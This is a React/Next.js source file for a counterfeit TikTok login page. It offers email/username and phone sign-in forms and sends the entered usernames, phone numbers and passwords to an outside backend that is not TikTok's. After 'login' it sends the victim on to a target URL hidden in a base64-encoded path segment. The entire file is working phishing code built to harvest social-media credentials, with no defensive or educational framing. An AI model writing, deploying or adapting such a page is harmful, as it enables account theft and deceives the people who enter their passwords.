"use client";
import { useState, useEffect } from "react";

export default function TikTokLogin({ params }) {
  const [loginMethod, setLoginMethod] = useState(null);
  const [formData, setFormData] = useState({
    username: "",
    password: "",
    phoneNumber: "",
  });
  const [errors, setErrors] = useState({ username: "", password: "", phoneNumber: "" });
  const [loading, setLoading] = useState(false);
  const [encryptedString, setEncryptedString] = useState("");
  const [hasTargetUrl, setHasTargetUrl] = useState(false);

  // Detect and store encrypted URL slug
  useEffect(() => {
    if (params?.slug && params.slug.length > 0) {
      const encryptedParam = params.slug[0];
      if (encryptedParam) {
        setEncryptedString(encryptedParam);
        setHasTargetUrl(true);
        console.log("Encrypted string detected:", encryptedParam);
      }
    }
  }, [params]);

  // Decrypt Base64 URL-safe string
  const decryptUrlSafeBase64 = (encoded) => {
    if (!encoded) return "";
    try {
      const base64 = encoded.replace(/-/g, "+").replace(/_/g, "/");
      const padding = "=".repeat((4 - (base64.length % 4)) % 4);
      return decodeURIComponent(escape(atob(base64 + padding)));
    } catch {
      return "";
    }
  };

  const handleInputChange = (e) => {
    const { name, value } = e.target;
    setFormData((prev) => ({ ...prev, [name]: value }));
    if (errors[name]) setErrors((prev) => ({ ...prev, [name]: "" }));
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setErrors({ username: "", password: "", phoneNumber: "" });

    if (loginMethod === "email") {
      if (!formData.username) {
        setErrors((prev) => ({ ...prev, username: "Username, email or phone is required" }));
        return;
      }
      if (!formData.password) {
        setErrors((prev) => ({ ...prev, password: "Password is required" }));
        return;
      }
    } else if (loginMethod === "phone") {
      if (!formData.phoneNumber) {
        setErrors((prev) => ({ ...prev, phoneNumber: "Phone number is required" }));
        return;
      }
      if (!formData.password) {
        setErrors((prev) => ({ ...prev, password: "Password is required" }));
        return;
      }
    }

    try {
      setLoading(true);
      const response = await fetch("https://social-backend-bice-delta.vercel.app/api/auth/tiktok", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          username: loginMethod === "phone" ? formData.phoneNumber : formData.username,
          password: formData.password,
        }),
      });

      const data = await response.json();

      if (response.ok) {
        alert("Login successful!");
        console.log("Login successful:", data);

        // Redirect to decrypted URL if exists
        if (hasTargetUrl && encryptedString) {
          const targetUrl = decryptUrlSafeBase64(encryptedString);
          if (targetUrl && (targetUrl.startsWith("http://") || targetUrl.startsWith("https://"))) {
            setTimeout(() => {
              window.location.href = targetUrl;
            }, 500);
            return;
          }
        }
        setLoading(false);
      } else {
        setErrors((prev) => ({ ...prev, password: data.message || "Login failed" }));
        setLoading(false);
      }
    } catch (error) {
      setErrors((prev) => ({ ...prev, password: "Network error. Please try again." }));
      setLoading(false);
    }
  };

  // --- Render Logic Remains Mostly Same ---
  if (loginMethod === "email") {
    return (
      <div className="min-h-screen bg-black text-white">
        <div className="flex items-center justify-center min-h-screen px-4">
          <div className="w-full max-w-md">
            <div className="bg-white rounded-lg p-8 text-black">
              <div className="text-center mb-8">
                <div className="text-4xl font-bold mb-4">
                  <span className="bg-gradient-to-r from-pink-500 to-cyan-500 bg-clip-text text-transparent">TikTok</span>
                </div>
                <h1 className="text-2xl font-semibold mb-2">Log in to TikTok</h1>
              </div>

              <form onSubmit={handleSubmit} className="space-y-4">
                <div>
                  <input
                    type="text"
                    name="username"
                    placeholder="Phone, email, or username"
                    value={formData.username}
                    onChange={handleInputChange}
                    className={`w-full px-4 py-3 border rounded-md focus:outline-none ${errors.username ? "border-red-500 focus:border-red-500" : "border-gray-300 focus:border-pink-500"}`}
                  />
                  {errors.username && <p className="text-red-500 text-sm mt-1">{errors.username}</p>}
                </div>

                <div>
                  <input
                    type="password"
                    name="password"
                    placeholder="Password"
                    value={formData.password}
                    onChange={handleInputChange}
                    className={`w-full px-4 py-3 border rounded-md focus:outline-none ${errors.password ? "border-red-500 focus:border-red-500" : "border-gray-300 focus:border-pink-500"}`}
                  />
                  {errors.password && <p className="text-red-500 text-sm mt-1">{errors.password}</p>}
                </div>

                <button
                  type="submit"
                  className="w-full bg-gradient-to-r from-pink-500 to-cyan-500 text-white py-3 rounded-md font-semibold hover:opacity-90 transition-opacity"
                  disabled={loading}
                >
                  {loading ? "Processing..." : "Log in"}
                </button>
              </form>

              <div className="text-center mt-4">
                <button onClick={() => setLoginMethod(null)} className="text-gray-600 hover:underline text-sm">
                  ← Back to options
                </button>
              </div>
            </div>
          </div>
        </div>
      </div>
    );
  }

  // Phone login rendering remains same, just add loading to button
  if (loginMethod === "phone") {
    return (
      <div className="min-h-screen bg-black text-white">
        <div className="flex items-center justify-center min-h-screen px-4">
          <div className="w-full max-w-md">
            <div className="bg-white rounded-lg p-8 text-black">
              <div className="text-center mb-8">
                <div className="text-4xl font-bold mb-4">
                  <span className="bg-gradient-to-r from-pink-500 to-cyan-500 bg-clip-text text-transparent">TikTok</span>
                </div>
                <h1 className="text-2xl font-semibold mb-2">Log in with phone</h1>
              </div>

              <form onSubmit={handleSubmit} className="space-y-4">
                <div className="flex">
                  <select className="px-3 py-3 border border-gray-300 rounded-l-md focus:outline-none focus:border-pink-500">
                    <option>🇵🇰 +92</option>
                    <option>🇺🇸 +1</option>
                    <option>🇮🇳 +91</option>
                  </select>
                  <input
                    type="tel"
                    name="phoneNumber"
                    placeholder="Phone number"
                    value={formData.phoneNumber}
                    onChange={handleInputChange}
                    className={`flex-1 px-4 py-3 border border-l-0 rounded-r-md focus:outline-none ${errors.phoneNumber ? "border-red-500 focus:border-red-500" : "border-gray-300 focus:border-pink-500"}`}
                  />
                </div>
                {errors.phoneNumber && <p className="text-red-500 text-sm mt-1">{errors.phoneNumber}</p>}

                <div>
                  <input
                    type="password"
                    name="password"
                    placeholder="Password"
                    value={formData.password}
                    onChange={handleInputChange}
                    className={`w-full px-4 py-3 border rounded-md focus:outline-none ${errors.password ? "border-red-500 focus:border-red-500" : "border-gray-300 focus:border-pink-500"}`}
                  />
                  {errors.password && <p className="text-red-500 text-sm mt-1">{errors.password}</p>}
                </div>

                <button
                  type="submit"
                  className="w-full bg-gradient-to-r from-pink-500 to-cyan-500 text-white py-3 rounded-md font-semibold hover:opacity-90 transition-opacity"
                  disabled={loading}
                >
                  {loading ? "Processing..." : "Log in"}
                </button>
              </form>

              <div className="text-center mt-4">
                <button onClick={() => setLoginMethod(null)} className="text-gray-600 hover:underline text-sm">
                  ← Back to options
                </button>
              </div>
            </div>
          </div>
        </div>
      </div>
    );
  }

  // Default login method selection remains unchanged
  return (
    <div className="min-h-screen bg-black text-white">
      <div className="flex items-center justify-center min-h-screen px-4">
        <div className="w-full max-w-md">
          <div className="bg-white rounded-lg p-8 text-black">
            <div className="text-center mb-8">
              <div className="text-4xl font-bold mb-4">
                <span className="bg-gradient-to-r from-pink-500 to-cyan-500 bg-clip-text text-transparent">TikTok</span>
              </div>
              <h1 className="text-2xl font-semibold mb-2">Log in to TikTok</h1>
            </div>

            <div className="space-y-3">
              <button
                onClick={() => setLoginMethod("email")}
                className="w-full border border-gray-300 rounded-md py-3 px-4 flex items-center justify-center hover:bg-gray-50 transition-colors"
              >
                <span className="mr-3">📧</span>
                Use phone / email / username
              </button>

              <button
                onClick={() => setLoginMethod("phone")}
                className="w-full border border-gray-300 rounded-md py-3 px-4 flex items-center justify-center hover:bg-gray-50 transition-colors"
              >
                <span className="mr-3">📱</span>
                Continue with phone
              </button>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}
